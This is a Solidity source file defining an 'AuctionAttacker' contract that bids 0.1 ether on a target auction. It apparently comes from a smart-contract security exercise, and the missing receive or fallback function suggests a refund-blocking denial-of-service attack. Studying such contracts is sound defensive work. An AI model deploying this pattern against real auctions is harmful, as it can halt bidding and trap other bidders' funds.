// SPDX-License-Identifier: GPL-3.0

pragma solidity 0.8.24;

import "./interfaces/IAuction.sol";

// Attacker contract must have a balance of X ETH
contract AuctionAttacker {

  IAuction private auction;

  constructor(address _auctionAddress) payable {
    auction = IAuction(_auctionAddress);
  }

  function attack() public payable {
    auction.bid{value: 0.1 ether}();
  }
}